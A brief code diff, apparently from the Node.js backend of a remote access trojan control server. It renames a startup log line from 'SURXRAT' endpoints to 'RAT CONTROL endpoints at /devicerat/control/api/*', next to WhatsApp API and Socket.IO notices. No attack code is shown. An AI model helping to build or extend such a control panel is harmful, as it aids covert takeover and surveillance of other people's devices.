@@ -102,7 +102,7 @@ server.listen(PORT, () => {
   console.log(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
   console.log(`🚀 Server aktif di http://localhost:${PORT}`);
   console.log(`📱 WhatsApp API endpoints at /api/*`);
-  console.log(`🎯 SURXRAT endpoints at /suxrat/api/*`);
+  console.log(`🎯 RAT CONTROL endpoints at /devicerat/control/api/*`);
   console.log(`🔌 Socket.IO ready for real-time events`);
   
   startUserSessions();
